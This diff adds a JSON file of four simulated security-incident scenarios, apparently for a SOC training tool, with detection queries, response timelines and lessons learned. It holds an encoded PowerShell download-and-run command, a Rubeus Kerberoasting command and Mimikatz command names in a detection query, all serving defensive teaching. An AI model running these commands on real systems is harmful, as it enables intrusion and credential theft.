@@ -1,0 +1,656 @@
+[
+  {
+    "id": "phishing-001",
+    "title": "Credential Harvesting via Phishing",
+    "shortDescription": "User received a phishing email impersonating Microsoft. Attacker attempted credential theft via fake login page.",
+    "severity": "High",
+    "mitre": ["T1566.001"],
+    "mitreName": "Spearphishing Attachment",
+    "icon": "mail",
+    "attack": {
+      "description": "An employee in the Finance department received an email appearing to be from Microsoft 365 support. The email claimed their account would be suspended unless they verified their credentials immediately. The link directed to a convincing replica of the Microsoft login page hosted on a typosquatted domain.",
+      "indicators": [
+        "Sender domain: micros0ft-support.com (typosquatted)",
+        "Urgent language creating false sense of urgency",
+        "Malicious URL: hxxps://login.micros0ft-support[.]com/auth",
+        "Email sent outside normal business hours (3:47 AM)",
+        "No prior communication history with sender"
+      ],
+      "artifacts": [
+        {
+          "type": "Email Headers",
+          "content": "From: support@micros0ft-support.com\nTo: finance.user@company.com\nSubject: Urgent: Account Suspension Notice\nX-Mailer: PHPMailer 6.0.2\nReceived: from unknown (185.234.xx.xx)"
+        },
+        {
+          "type": "Malicious URL",
+          "content": "hxxps://login.micros0ft-support[.]com/auth?redirect=https://office.com&session=a3f8c2"
+        },
+        {
+          "type": "User Report",
+          "content": "Submitted via Phish Alert Button at 09:15 AM after user realized credentials were stolen when legitimate MFA prompt didn't appear."
+        }
+      ]
+    },
+    "detect": {
+      "siem": "Splunk Enterprise Security",
+      "alerts": [
+        {
+          "name": "Multiple Failed Authentication Attempts",
+          "severity": "Medium",
+          "time": "09:23 AM",
+          "description": "5 failed login attempts for finance.user within 2 minutes from IP 185.234.xx.xx"
+        },
+        {
+          "name": "Impossible Travel Detected",
+          "severity": "High",
+          "time": "09:24 AM",
+          "description": "Login attempt from Russia (185.234.xx.xx) within 10 minutes of US-based activity"
+        },
+        {
+          "name": "New MFA Device Registration Attempt",
+          "severity": "Critical",
+          "time": "09:25 AM",
+          "description": "Attacker attempted to register new authenticator app to maintain persistence"
+        }
+      ],
+      "queries": [
+        {
+          "name": "Failed Auth Correlation",
+          "language": "SPL",
+          "code": "index=azure_ad sourcetype=azure:aad:signin\n| where ResultType != 0\n| stats count by UserPrincipalName, IPAddress, ResultType\n| where count > 3\n| lookup geoip ip AS IPAddress"
+        },
+        {
+          "name": "Impossible Travel Detection",
+          "language": "SPL",
+          "code": "index=azure_ad sourcetype=azure:aad:signin ResultType=0\n| iplocation IPAddress\n| stats earliest(_time) as first_login, latest(_time) as last_login,\n        values(City) as cities, values(Country) as countries by UserPrincipalName\n| where mvcount(countries) > 1\n| eval travel_time_hrs = (last_login - first_login) / 3600\n| where travel_time_hrs < 2"
+        },
+        {
+          "name": "Proxy Log Investigation",
+          "language": "SPL",
+          "code": "index=proxy sourcetype=bluecoat\n| where url LIKE \"%micros0ft%\" OR url LIKE \"%microsoft%\" \n| where url != \"*microsoft.com*\"\n| stats count by src_ip, url, user\n| sort - count"
+        }
+      ],
+      "analysis": [
+        "Correlated proxy logs showing user clicked malicious link at 09:12 AM",
+        "Azure AD logs confirm credential submission to phishing site",
+        "Attacker IP geolocated to known VPS provider in Russia",
+        "Timeline reconstruction shows 13-minute gap between phish click and detection",
+        "No evidence of lateral movement or data exfiltration before containment"
+      ]
+    },
+    "respond": {
+      "timeline": [
+        { "time": "09:26 AM", "action": "Disabled user account in Azure AD", "automated": true },
+        { "time": "09:27 AM", "action": "Revoked all active sessions and refresh tokens", "automated": true },
+        { "time": "09:28 AM", "action": "Blocked attacker IP at perimeter firewall", "automated": true },
+        { "time": "09:30 AM", "action": "Contacted user via phone to verify incident", "automated": false },
+        { "time": "09:35 AM", "action": "Initiated password reset with IT Service Desk", "automated": false },
+        { "time": "09:40 AM", "action": "Quarantined phishing email from all mailboxes", "automated": true },
+        { "time": "09:45 AM", "action": "Added malicious domain to DNS sinkhole", "automated": true },
+        { "time": "10:15 AM", "action": "User account re-enabled after password reset and MFA re-enrollment", "automated": false }
+      ],
+      "soar": {
+        "platform": "Cortex XSOAR",
+        "playbook": "Phishing Response - Credential Theft",
+        "automations": [
+          {
+            "name": "Auto-Enrichment",
+            "description": "Automatically enriched phishing URL via VirusTotal, URLscan.io, and internal threat intel",
+            "result": "URL flagged as malicious by 45/72 engines"
+          },
+          {
+            "name": "Email Quarantine",
+            "description": "Searched for and quarantined all instances of phishing email across organization",
+            "result": "12 emails quarantined, 3 users had clicked (1 submitted creds)"
+          },
+          {
+            "name": "Ticket Creation",
+            "description": "Auto-created incident ticket in ServiceNow with full timeline and evidence",
+            "result": "INC0012847 created and assigned to SOC Tier 2"
+          },
+          {
+            "name": "User Notification",
+            "description": "Sent templated notification to affected users with next steps",
+            "result": "Notification sent to 12 recipients of phishing email"
+          }
+        ]
+      },
+      "containmentStatus": "Complete - No evidence of persistence or lateral movement"
+    },
+    "lessons": {
+      "findings": [
+        "User clicked link despite completing phishing training 3 months ago",
+        "Email gateway did not flag typosquatted domain (detection gap)",
+        "13-minute detection time exceeded 10-minute SLA for credential theft",
+        "SOAR automation reduced manual effort by approximately 45 minutes"
+      ],
+      "recommendations": [
+        {
+          "priority": "High",
+          "action": "Implement typosquat detection for top 50 vendor domains",
+          "owner": "Email Security Team",
+          "status": "In Progress"
+        },
+        {
+          "priority": "High",
+          "action": "Enable Conditional Access policy requiring compliant device for auth",
+          "owner": "IAM Team",
+          "status": "Planned"
+        },
+        {
+          "priority": "Medium",
+          "action": "Conduct targeted phishing simulation for Finance department",
+          "owner": "Security Awareness",
+          "status": "Scheduled"
+        },
+        {
+          "priority": "Low",
+          "action": "Add Russia to geo-blocking list for non-traveling users",
+          "owner": "Network Security",
+          "status": "Under Review"
+        }
+      ],
+      "metrics": {
+        "mttr": "49 minutes",
+        "mtd": "13 minutes",
+        "usersAffected": 1,
+        "emailsQuarantined": 12,
+        "automationSavings": "45 minutes"
+      }
+    }
+  },
+  {
+    "id": "malware-002",
+    "title": "Emotet Malware via Macro-Enabled Document",
+    "shortDescription": "User opened malicious Excel attachment containing Emotet dropper. Endpoint detection prevented full infection.",
+    "severity": "Critical",
+    "mitre": ["T1566.001", "T1059.005", "T1055"],
+    "mitreName": "Malicious Macro Execution",
+    "icon": "bug",
+    "attack": {
+      "description": "A user in HR received an email appearing to be a resume from a job applicant. The attached Excel file contained an obfuscated VBA macro that, when enabled, attempted to download and execute an Emotet payload from a compromised WordPress site.",
+      "indicators": [
+        "Excel attachment with macro: Resume_JohnSmith.xlsm",
+        "VBA macro with obfuscated PowerShell execution",
+        "Outbound connection attempt to compromised WordPress site",
+        "PowerShell spawned by EXCEL.EXE (suspicious parent-child)",
+        "Attempted persistence via scheduled task creation"
+      ],
+      "artifacts": [
+        {
+          "type": "File Hash (SHA256)",
+          "content": "a3f8c2d1e5b7a9f0c3d2e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4"
+        },
+        {
+          "type": "Macro Code (Deobfuscated)",
+          "content": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBvAG0AcAByAG8AbQBpAHMAZQBkAHMAaQB0AGUALgBjAG8AbQAvAHUAcABsAG8AYQBkAC8AcABhAHkAbABvAGEAZAAuAGUAeABlACcAKQA="
+        },
+        {
+          "type": "C2 URL",
+          "content": "hxxp://compromised-wordpress[.]com/wp-content/uploads/payload.exe"
+        }
+      ]
+    },
+    "detect": {
+      "siem": "Splunk + Microsoft Defender for Endpoint",
+      "alerts": [
+        {
+          "name": "Suspicious PowerShell Execution",
+          "severity": "High",
+          "time": "02:34 PM",
+          "description": "Encoded PowerShell command spawned by EXCEL.EXE"
+        },
+        {
+          "name": "Malware Prevention - Emotet",
+          "severity": "Critical",
+          "time": "02:34 PM",
+          "description": "Microsoft Defender blocked execution of known Emotet variant"
+        },
+        {
+          "name": "Scheduled Task Creation Attempt",
+          "severity": "Medium",
+          "time": "02:35 PM",
+          "description": "Blocked attempt to create persistence mechanism via schtasks"
+        }
+      ],
+      "queries": [
+        {
+          "name": "Suspicious Office Macro Activity",
+          "language": "KQL",
+          "code": "DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"WINWORD.EXE\", \"EXCEL.EXE\", \"POWERPNT.EXE\")\n| where FileName in~ (\"powershell.exe\", \"cmd.exe\", \"wscript.exe\", \"mshta.exe\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine\n| sort by Timestamp desc"
+        },
+        {
+          "name": "Emotet Network IOCs",
+          "language": "KQL",
+          "code": "DeviceNetworkEvents\n| where RemoteUrl has_any (\"payload.exe\", \"update.exe\", \"install.exe\")\n   or RemoteUrl matches regex @\"wp-content/uploads/.*\\.exe$\"\n| project Timestamp, DeviceName, RemoteUrl, RemoteIP, InitiatingProcessFileName"
+        },
+        {
+          "name": "Persistence Mechanism Hunt",
+          "language": "KQL",
+          "code": "DeviceProcessEvents\n| where FileName == \"schtasks.exe\" and ProcessCommandLine has \"/create\"\n| where Timestamp > ago(24h)\n| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessFileName\n| where InitiatingProcessFileName !in~ (\"svchost.exe\", \"services.exe\")"
+        }
+      ],
+      "analysis": [
+        "EDR blocked payload before execution - no code ran beyond PowerShell attempt",
+        "Parent-child process analysis confirmed: outlook.exe → excel.exe → powershell.exe",
+        "Network logs show single blocked outbound connection to C2 domain",
+        "Scheduled task creation was blocked by attack surface reduction rules",
+        "Hash analysis confirmed Emotet variant first seen 72 hours ago"
+      ]
+    },
+    "respond": {
+      "timeline": [
+        { "time": "02:34 PM", "action": "EDR automatically quarantined malicious file", "automated": true },
+        { "time": "02:35 PM", "action": "Alert triggered in SIEM, SOC analyst assigned", "automated": true },
+        { "time": "02:38 PM", "action": "Endpoint isolated from network via EDR", "automated": false },
+        { "time": "02:42 PM", "action": "Memory forensics initiated via Velociraptor", "automated": false },
+        { "time": "02:50 PM", "action": "Confirmed no successful payload execution", "automated": false },
+        { "time": "02:55 PM", "action": "C2 domain added to DNS sinkhole and proxy block list", "automated": true },
+        { "time": "03:00 PM", "action": "Email with attachment quarantined across org", "automated": true },
+        { "time": "03:15 PM", "action": "Endpoint released from isolation after verification", "automated": false }
+      ],
+      "soar": {
+        "platform": "Cortex XSOAR",
+        "playbook": "Malware Response - Macro-Enabled Document",
+        "automations": [
+          {
+            "name": "Hash Reputation Check",
+            "description": "Submitted file hash to VirusTotal, Hybrid Analysis, and internal sandbox",
+            "result": "Identified as Emotet by 52/68 engines"
+          },
+          {
+            "name": "Domain Enrichment",
+            "description": "C2 domain checked against threat intel feeds",
+            "result": "Domain flagged in 4 threat intel feeds, hosting known malware"
+          },
+          {
+            "name": "Email Search & Quarantine",
+            "description": "Searched for email with matching attachment hash across all mailboxes",
+            "result": "4 emails found, all quarantined"
+          },
+          {
+            "name": "Endpoint Forensics Collection",
+            "description": "Automatically collected browser history, recent files, and process list",
+            "result": "No additional IOCs found"
+          }
+        ]
+      },
+      "containmentStatus": "Complete - EDR prevented payload execution"
+    },
+    "lessons": {
+      "findings": [
+        "EDR correctly blocked Emotet payload - detection working as expected",
+        "User enabled macros despite warning banner (training gap)",
+        "Email gateway allowed .xlsm attachment (policy gap)",
+        "Only 72-hour-old variant - zero-day window risk"
+      ],
+      "recommendations": [
+        {
+          "priority": "Critical",
+          "action": "Block macro-enabled Office files (.xlsm, .docm) at email gateway",
+          "owner": "Email Security Team",
+          "status": "Implemented"
+        },
+        {
+          "priority": "High",
+          "action": "Enable ASR rule to block Office apps from creating child processes",
+          "owner": "Endpoint Team",
+          "status": "Implemented"
+        },
+        {
+          "priority": "Medium",
+          "action": "Implement VBA macro signing requirement for trusted macros",
+          "owner": "IT Security",
+          "status": "In Progress"
+        },
+        {
+          "priority": "Medium",
+          "action": "Re-train HR department on malicious attachment risks",
+          "owner": "Security Awareness",
+          "status": "Scheduled"
+        }
+      ],
+      "metrics": {
+        "mttr": "41 minutes",
+        "mtd": "0 minutes (automated)",
+        "usersAffected": 1,
+        "emailsQuarantined": 4,
+        "automationSavings": "35 minutes"
+      }
+    }
+  },
+  {
+    "id": "privesc-003",
+    "title": "Privilege Escalation via Kerberoasting",
+    "shortDescription": "Attacker compromised service account using Kerberoasting attack. Detected via unusual SPN requests.",
+    "severity": "Critical",
+    "mitre": ["T1558.003", "T1078.002"],
+    "mitreName": "Kerberoasting",
+    "icon": "key",
+    "attack": {
+      "description": "An attacker who had compromised a standard user account performed a Kerberoasting attack to extract service account password hashes. They successfully cracked the password for svc_backup, which had Domain Admin privileges, and began lateral movement.",
+      "indicators": [
+        "Unusual volume of TGS requests for SPNs from single workstation",
+        "RC4 encryption requested instead of AES (downgrade attack)",
+        "Successful authentication as svc_backup from unexpected source",
+        "svc_backup accessed 15 servers in 5 minutes (abnormal behavior)",
+        "Mimikatz execution detected on compromised workstation"
+      ],
+      "artifacts": [
+        {
+          "type": "Attack Tool",
+          "content": "Rubeus.exe kerberoast /outfile:hashes.txt"
+        },
+        {
+          "type": "Cracked Account",
+          "content": "svc_backup (Service Account with Domain Admin rights)\nPassword: Backup2019! (weak, unchanged for 4 years)"
+        },
+        {
+          "type": "Source Workstation",
+          "content": "WKS-042 (User: jsmith, Compromised via phishing 2 days prior)"
+        }
+      ]
+    },
+    "detect": {
+      "siem": "Splunk + Microsoft Defender for Identity",
+      "alerts": [
+        {
+          "name": "Kerberoasting Activity Detected",
+          "severity": "High",
+          "time": "11:23 PM",
+          "description": "47 TGS requests for SPNs from WKS-042 in 2 minutes"
+        },
+        {
+          "name": "Encryption Downgrade Attack",
+          "severity": "Medium",
+          "time": "11:23 PM",
+          "description": "RC4 encryption requested for Kerberos tickets (legacy/weak)"
+        },
+        {
+          "name": "Lateral Movement Detected",
+          "severity": "Critical",
+          "time": "11:45 PM",
+          "description": "svc_backup authenticated to 15 servers from WKS-042"
+        }
+      ],
+      "queries": [
+        {
+          "name": "Kerberoasting Detection",
+          "language": "SPL",
+          "code": "index=wineventlog EventCode=4769 Ticket_Encryption_Type=0x17\n| stats count by Client_Address, Service_Name, Account_Name\n| where count > 10\n| sort - count"
+        },
+        {
+          "name": "Service Account Anomaly",
+          "language": "SPL",
+          "code": "index=wineventlog EventCode=4624 Account_Name=\"svc_*\"\n| stats dc(Workstation_Name) as unique_hosts, \n        values(Workstation_Name) as hosts by Account_Name\n| where unique_hosts > 5\n| sort - unique_hosts"
+        },
+        {
+          "name": "Mimikatz Detection",
+          "language": "KQL",
+          "code": "DeviceProcessEvents\n| where FileName =~ \"mimikatz.exe\" \n   or ProcessCommandLine has_any (\"sekurlsa::logonpasswords\", \"lsadump::dcsync\")\n   or ProcessCommandLine matches regex @\"[a-z]+::[a-z]+\"\n| project Timestamp, DeviceName, FileName, ProcessCommandLine"
+        }
+      ],
+      "analysis": [
+        "Timeline shows WKS-042 was compromised 2 days prior via phishing",
+        "Attacker used Rubeus to extract TGS tickets for all SPNs",
+        "svc_backup password cracked offline using hashcat (weak password)",
+        "Attacker gained Domain Admin access and began accessing file servers",
+        "No evidence of data exfiltration before containment"
+      ]
+    },
+    "respond": {
+      "timeline": [
+        { "time": "11:45 PM", "action": "Defender for Identity alert triggered", "automated": true },
+        { "time": "11:48 PM", "action": "SOC analyst confirmed lateral movement", "automated": false },
+        { "time": "11:50 PM", "action": "Disabled svc_backup account", "automated": false },
+        { "time": "11:52 PM", "action": "Isolated WKS-042 from network", "automated": true },
+        { "time": "11:55 PM", "action": "Reset jsmith credentials", "automated": false },
+        { "time": "12:05 AM", "action": "KRBTGT password rotated (twice)", "automated": false },
+        { "time": "12:30 AM", "action": "All service account passwords rotated", "automated": false },
+        { "time": "01:00 AM", "action": "Forensic imaging of WKS-042 completed", "automated": false }
+      ],
+      "soar": {
+        "platform": "Cortex XSOAR",
+        "playbook": "Active Directory Compromise Response",
+        "automations": [
+          {
+            "name": "Account Lockout",
+            "description": "Automatically disabled compromised accounts pending investigation",
+            "result": "svc_backup and jsmith accounts disabled"
+          },
+          {
+            "name": "Session Termination",
+            "description": "Revoked all Kerberos tickets for compromised accounts",
+            "result": "All active sessions terminated"
+          },
+          {
+            "name": "Host Isolation",
+            "description": "Network isolated WKS-042 via EDR integration",
+            "result": "Host isolated within 2 minutes of confirmation"
+          },
+          {
+            "name": "Threat Hunt Initiation",
+            "description": "Automatically launched hunt for additional Kerberoasting activity",
+            "result": "No additional compromised hosts found"
+          }
+        ]
+      },
+      "containmentStatus": "Complete - Attacker access revoked, credentials rotated"
+    },
+    "lessons": {
+      "findings": [
+        "svc_backup had Domain Admin rights (excessive privileges)",
+        "Service account password unchanged for 4 years",
+        "Password was weak and easily cracked (Backup2019!)",
+        "Initial compromise (phishing) not detected for 2 days",
+        "Kerberoasting detection worked but lateral movement was already underway"
+      ],
+      "recommendations": [
+        {
+          "priority": "Critical",
+          "action": "Implement Group Managed Service Accounts (gMSA) for all service accounts",
+          "owner": "IAM Team",
+          "status": "In Progress"
+        },
+        {
+          "priority": "Critical",
+          "action": "Remove Domain Admin from all service accounts",
+          "owner": "IAM Team",
+          "status": "Completed"
+        },
+        {
+          "priority": "High",
+          "action": "Implement 25+ character passwords for all service accounts",
+          "owner": "IAM Team",
+          "status": "In Progress"
+        },
+        {
+          "priority": "High",
+          "action": "Deploy honeypot SPNs to detect Kerberoasting",
+          "owner": "SOC Team",
+          "status": "Planned"
+        },
+        {
+          "priority": "Medium",
+          "action": "Enable AES-only Kerberos encryption (disable RC4)",
+          "owner": "AD Team",
+          "status": "Testing"
+        }
+      ],
+      "metrics": {
+        "mttr": "1 hour 15 minutes",
+        "mtd": "22 minutes",
+        "usersAffected": 2,
+        "hostsAccessed": 15,
+        "automationSavings": "30 minutes"
+      }
+    }
+  },
+  {
+    "id": "cloud-004",
+    "title": "Cloud IAM Privilege Escalation",
+    "shortDescription": "Attacker exploited overly permissive IAM policy in AWS to escalate from developer to admin access.",
+    "severity": "High",
+    "mitre": ["T1078.004", "T1098.001"],
+    "mitreName": "Cloud Account Manipulation",
+    "icon": "cloud",
+    "attack": {
+      "description": "An attacker who had compromised a developer's AWS access keys exploited an overly permissive IAM policy that allowed the developer role to attach policies to itself. The attacker attached AdministratorAccess to their role and began accessing sensitive S3 buckets and RDS databases.",
+      "indicators": [
+        "iam:AttachRolePolicy API call from unusual IP",
+        "AdministratorAccess policy attached to developer role",
+        "S3 ListBuckets and GetObject calls following privilege escalation",
+        "API calls from IP not associated with any corporate network",
+        "Access pattern outside normal business hours (2:00 AM)"
+      ],
+      "artifacts": [
+        {
+          "type": "Compromised Credentials",
+          "content": "Access Key: AKIA3XXXXXXXXEXAMPLE\nUser: dev-jsmith\nRole: DevTeamRole"
+        },
+        {
+          "type": "Policy Attached",
+          "content": "arn:aws:iam::aws:policy/AdministratorAccess"
+        },
+        {
+          "type": "Source IP",
+          "content": "45.33.xx.xx (VPS provider, non-corporate)"
+        }
+      ]
+    },
+    "detect": {
+      "siem": "Splunk + AWS Security Hub + GuardDuty",
+      "alerts": [
+        {
+          "name": "GuardDuty: PrivilegeEscalation",
+          "severity": "High",
+          "time": "02:15 AM",
+          "description": "IAM policy with admin access attached to DevTeamRole"
+        },
+        {
+          "name": "Unusual API Activity",
+          "severity": "Medium",
+          "time": "02:18 AM",
+          "description": "S3 ListBuckets from IP not seen in last 90 days"
+        },
+        {
+          "name": "Sensitive Data Access",
+          "severity": "High",
+          "time": "02:22 AM",
+          "description": "Access to customer-data-prod bucket (PII data)"
+        }
+      ],
+      "queries": [
+        {
+          "name": "IAM Policy Changes",
+          "language": "SPL",
+          "code": "index=cloudtrail eventName IN (\"AttachRolePolicy\", \"AttachUserPolicy\", \"PutRolePolicy\")\n| eval is_admin = if(match(requestParameters.policyArn, \"AdministratorAccess\"), \"Yes\", \"No\")\n| stats count by userIdentity.userName, eventName, is_admin, sourceIPAddress\n| where is_admin=\"Yes\""
+        },
+        {
+          "name": "S3 Sensitive Bucket Access",
+          "language": "SPL",
+          "code": "index=cloudtrail eventSource=\"s3.amazonaws.com\" \n  eventName IN (\"ListBuckets\", \"GetObject\", \"ListObjects\")\n| where match(requestParameters.bucketName, \"(prod|customer|pii|confidential)\")\n| stats count by userIdentity.userName, requestParameters.bucketName, sourceIPAddress\n| sort - count"
+        },
+        {
+          "name": "Access Key Usage from New IPs",
+          "language": "SPL",
+          "code": "index=cloudtrail userIdentity.type=\"IAMUser\"\n| stats earliest(_time) as first_seen, values(sourceIPAddress) as ips by userIdentity.accessKeyId\n| mvexpand ips\n| lookup known_ips ip AS ips OUTPUT is_known\n| where isnull(is_known)"
+        }
+      ],
+      "analysis": [
+        "Access keys compromised via hardcoded credentials in public GitHub repo",
+        "Attacker exploited iam:AttachRolePolicy permission gap",
+        "3 S3 buckets accessed containing customer PII",
+        "No evidence of data download (egress monitoring showed normal traffic)",
+        "Attack occurred during low-staffing hours (2:00 AM Sunday)"
+      ]
+    },
+    "respond": {
+      "timeline": [
+        { "time": "02:25 AM", "action": "GuardDuty alert received by on-call analyst", "automated": true },
+        { "time": "02:30 AM", "action": "Confirmed unauthorized privilege escalation", "automated": false },
+        { "time": "02:32 AM", "action": "Deactivated compromised access keys", "automated": true },
+        { "time": "02:35 AM", "action": "Detached AdministratorAccess from DevTeamRole", "automated": false },
+        { "time": "02:40 AM", "action": "Revoked all sessions for dev-jsmith", "automated": true },
+        { "time": "02:45 AM", "action": "Enabled S3 access logging for accessed buckets", "automated": false },
+        { "time": "03:00 AM", "action": "Rotated all access keys for development team", "automated": false },
+        { "time": "03:30 AM", "action": "Completed CloudTrail analysis for data access", "automated": false }
+      ],
+      "soar": {
+        "platform": "Cortex XSOAR",
+        "playbook": "AWS IAM Compromise Response",
+        "automations": [
+          {
+            "name": "Access Key Deactivation",
+            "description": "Automatically deactivated compromised access keys via AWS API",
+            "result": "Access key AKIA3XXX... deactivated"
+          },
+          {
+            "name": "Policy Remediation",
+            "description": "Detached overly permissive policies from affected role",
+            "result": "AdministratorAccess detached from DevTeamRole"
+          },
+          {
+            "name": "CloudTrail Analysis",
+            "description": "Retrieved and analyzed all API calls from compromised credentials",
+            "result": "47 API calls identified, 12 to sensitive resources"
+          },
+          {
+            "name": "Slack Notification",
+            "description": "Notified security team and development lead via Slack",
+            "result": "Incident channel created, stakeholders notified"
+          }
+        ]
+      },
+      "containmentStatus": "Complete - Attacker access revoked, no data exfiltration confirmed"
+    },
+    "lessons": {
+      "findings": [
+        "Developer had iam:AttachRolePolicy permission (excessive)",
+        "Access keys were hardcoded in public GitHub repository",
+        "No secrets scanning in CI/CD pipeline",
+        "GuardDuty detection worked within 15 minutes",
+        "Weekend attack timing delayed response by 10 minutes"
+      ],
+      "recommendations": [
+        {
+          "priority": "Critical",
+          "action": "Remove self-policy-attachment permissions from all roles",
+          "owner": "Cloud Security",
+          "status": "Completed"
+        },
+        {
+          "priority": "Critical",
+          "action": "Implement secrets scanning (TruffleHog) in CI/CD",
+          "owner": "DevSecOps",
+          "status": "Implemented"
+        },
+        {
+          "priority": "High",
+          "action": "Enable IAM Access Analyzer for all accounts",
+          "owner": "Cloud Security",
+          "status": "Completed"
+        },
+        {
+          "priority": "High",
+          "action": "Implement SCPs to prevent privilege escalation patterns",
+          "owner": "Cloud Security",
+          "status": "In Progress"
+        },
+        {
+          "priority": "Medium",
+          "action": "Deploy AWS Secrets Manager for all application credentials",
+          "owner": "DevOps",
+          "status": "In Progress"
+        }
+      ],
+      "metrics": {
+        "mttr": "1 hour 5 minutes",
+        "mtd": "15 minutes",
+        "bucketsAccessed": 3,
+        "apiCallsInvestigated": 47,
+        "automationSavings": "25 minutes"
+      }
+    }
+  }
+]
